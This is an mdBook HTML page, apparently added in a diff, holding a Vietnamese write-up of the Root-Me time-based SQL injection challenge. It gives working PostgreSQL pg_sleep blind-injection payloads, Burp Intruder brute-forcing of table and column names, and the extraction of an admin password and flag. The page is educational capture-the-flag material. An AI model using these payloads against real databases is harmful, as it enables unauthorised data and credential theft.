@@ -1,0 +1,311 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>SQL Injection Time-based - RootMe Solutions &amp; Write-Ups</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="RootMe Solutions &amp; Write-Ups for education purposes.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon-de23e50b.svg">
+        <link rel="shortcut icon" href="../../favicon-8114d1fc.png">
+        <link rel="stylesheet" href="../../css/variables-0f4f7d13.css">
+        <link rel="stylesheet" href="../../css/general-d4e31f58.css">
+        <link rel="stylesheet" href="../../css/chrome-49e8d624.css">
+        <link rel="stylesheet" href="../../css/print-ad67d350.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome-799aeb25.css">
+        <link rel="stylesheet" href="../../fonts/fonts-9644e21d.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../highlight-493f70e1.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../tomorrow-night-4c0ae647.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../ayu-highlight-56612340.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "ayu";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc-edbf2422.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">RootMe Solutions &amp; Write-Ups</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/nh4ttruong/emtoor" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="write-up"><a class="header" href="#write-up">WRITE UP</a></h1>
+<p><strong>Challenge: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based">SQL Injection – Time-based</a></strong></p>
+<p>Về SQLi Time-based, đây là một loại SQLi Blind khi ta sử dụng thời gian res của req để dự đoán thông tin và BurpSuite sẽ hỗ trợ rất tốt về mảng này. Khi ta sử dụng một câu Query đúng, thời gian phản hồi sẽ chậm và ngược lại.</p>
+<p>Trong website, ta có một tab là Memberlist, có query như sau:</p>
+<p><em>http://challenge01.root-me.org/web-serveur/ch40/?action=memberlist&amp;member=<strong>[x]</strong></em></p>
+<img src="./media/image1.png" style="width:6.72382in;height:2.31814in" alt="Graphical user interface, application, website Description automatically generated" />
+<p>Ở đây, ta có thể lợi dụng để thực hiện tiêm payload vào đằng sau nó và thực hiện blind. Thử blind với payload bằng nhiều version() database khác nhau:</p>
+<img src="./media/image2.png" style="width:6.71617in;height:2.76611in" alt="Graphical user interface, text Description automatically generated" />
+<p>Payload: <em>3;select+case+when+(0=0)+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
+<p>Payload này sẽ khiến dtb res chậm hơn với pg_sleep() khi query đúng.</p>
+<ul>
+<li>Server thuộc dạng Postgresql: <a href="https://pgpedia.info/p/pg_sleep.html">pg_sleep() - pgPedia - a PostgreSQL Encyclopedia</a></li>
+</ul>
+<p>Từ đó, ta sẽ sử dụng Burp Intruder để thực hiện bruteforce table_name, column_name như các bài SQLi đã làm.</p>
+<ol>
+<li><strong>Tìm table_name</strong></li>
+</ol>
+<p>Trước tiên, ta cần tìm kiếm độ dài của table:</p>
+<p>Payload: <em><strong>3;select+case+when+((select+length(table_name)+from+information_schema.tables+limit+1)=[length])+then+pg_sleep(10)+else+pg_sleep(-1)+end—</strong></em></p>
+<p>Đưa vào Intruder và bruteforce:</p>
+<img src="./media/image3.png" style="width:6.5in;height:2.82222in" alt="Graphical user interface, application Description automatically generated" />
+<p>Ở bảng kết quả, ta filter lại cột “Response Complete”. Res nào có độ lớn cao nhất thì chắc hẳn đó là payload đúng.</p>
+<ul>
+<li>length(table_name) == 5</li>
+</ul>
+<p>Đã có table_name, ta tiến hành bruteforce table_name. Bỏ vào intruder:</p>
+<p><em>member=3;select+case+when+(substr((select+table_name+from+information_schema.tables+limit+1),<strong>§1§</strong>,1)=chr(<strong>§§</strong>))+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
+<img src="./media/image4.png" style="width:6.49862in;height:2.09615in" alt="Graphical user interface, application Description automatically generated" />
+<p>Ghép lại ta được <strong>table_name=users</strong></p>
+<ol>
+<li><strong>Tìm column_name</strong></li>
+</ol>
+<p>Tương tự như table_name, ta tìm length(column_name) của cột đầu tiên:</p>
+<img src="./media/image5.png" style="width:6.49972in;height:2.16667in" alt="Graphical user interface, application Description automatically generated" />
+<p>Kết quả trả về payload length(column_name) = 2. Ta có thể dự đoán nó có thể là ‘id’. Kiểm chứng bằng Repeater:</p>
+<ul>
+<li>Ký tự ‘i’:</li>
+</ul>
+<img src="./media/image6.png" style="width:6.20131in;height:2.5481in" alt="Graphical user interface, text Description automatically generated" />
+<ul>
+<li>Ký tự ‘d’:</li>
+</ul>
+<img src="./media/image7.png" style="width:6.5in;height:2.66111in" alt="Graphical user interface, text, email Description automatically generated" />
+<ul>
+<li>Cả 2 response đều tốn 2,285 miliseconds (tương tự thời gian fuzz, khác với response thông thường ~ 200 – 300 milisecond) column[0] == id</li>
+</ul>
+<p>Để tìm được column tiếp theo, ta sử dụng offset để filter lại và thực hiện tương tự, bruteforce thôi:</p>
+<img src="./media/image8.png" style="width:6.5in;height:2.68889in" alt="Graphical user interface, application Description automatically generated" />
+<ul>
+<li>length(column[2]) == 8</li>
+</ul>
+<img src="./media/image9.png" style="width:6.5in;height:2.96042in" alt="Table Description automatically generated" />
+<ul>
+<li>column_name[1] = username</li>
+</ul>
+<p>Column[2], có length == 9:</p>
+<img src="./media/image10.png" style="width:6.5in;height:2.68264in" alt="Graphical user interface, text Description automatically generated" />
+<p>Bruteforce được kết quả column_name[2] == firstname:</p>
+<img src="./media/image11.png" style="width:6.5in;height:3.33125in" alt="Graphical user interface, text, application Description automatically generated" />
+<p>Tương tự, column[3] có length == 8, và dễ dàng đoán được:</p>
+<ul>
+<li>column_name[3] == lastname:</li>
+</ul>
+<img src="./media/image12.png" style="width:6.5in;height:2.32431in" alt="Graphical user interface, text Description automatically generated" />
+<img src="./media/image13.png" style="width:6.5in;height:2.09514in" alt="Graphical user interface, text Description automatically generated" />
+<p>Column[4] có length == 5. Suy đoán và thử được kết quả:</p>
+<ul>
+<li>column_name[4] == email</li>
+</ul>
+<img src="./media/image14.png" style="width:6.5in;height:2.66319in" alt="Graphical user interface, text, email Description automatically generated" />
+<img src="./media/image15.png" style="width:6.5in;height:2.38194in" alt="Graphical user interface, text Description automatically generated" />
+<p>column[5] có độ dài ký tự là length == 8:</p>
+<img src="./media/image16.png" style="width:6.5in;height:2.41528in" alt="Graphical user interface, text Description automatically generated" />
+<p>Vì length ==8, ta thử kiểm chứng keyword = ‘password’ thì thấy trùng khớp:</p>
+<img src="./media/image17.png" style="width:6.5in;height:2.38472in" alt="Graphical user interface, text, application Description automatically generated" />
+<p>Như vậy, ta đã tìm được đúng cột password, giờ thì tìm password của admin. Admin có id=1, ta chỉ cần tìm kiếm với offset = 0 là sẽ ra.</p>
+<img src="./media/image18.png" style="width:6.5in;height:3.13958in" alt="Graphical user interface, application Description automatically generated" />
+<ul>
+<li><strong>length(password) == 13</strong></li>
+</ul>
+<p>Sau hơn 1 ngày bruteforce với payload, ta được kết quả:</p>
+<p><em>member=3;select+case+when+(substr((select+password+from+users+limit+1+offset+0),<strong>§§</strong>,1)=chr(<strong>§§</strong>))+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
+<img src="./media/image19.png" style="width:6.5in;height:3.0625in" alt="Graphical user interface, application, table, Excel Description automatically generated" />
+<p>Ta có được chuỗi ascii password: <strong>84 33 109 51 66 64 115 51 68 83 81 76 33</strong></p>
+<p>Convert to text: <strong>T!m3B@s3DSQL!</strong></p>
+<img src="./media/image20.png" style="width:6.5in;height:3.51597in" alt="A screenshot of a computer Description automatically generated" />
+<p><strong>Flag:</strong> T!m3B@s3DSQL!</p>
+<p>- Flag:</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../SQL-Injection/SQLinjection-Routed/SQLinjection-Routed.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../SQL-Injection/SQLinjectionnumeric/SQLinjectionnumeric.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../SQL-Injection/SQLinjection-Routed/SQLinjection-Routed.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../SQL-Injection/SQLinjectionnumeric/SQLinjectionnumeric.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr-ef4e11c1.min.js"></script>
+        <script src="../../mark-09e88c2c.min.js"></script>
+        <script src="../../searcher-6752007c.js"></script>
+
+        <script src="../../clipboard-1626706a.min.js"></script>
+        <script src="../../highlight-abc7f01d.js"></script>
+        <script src="../../book-66cfebdd.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
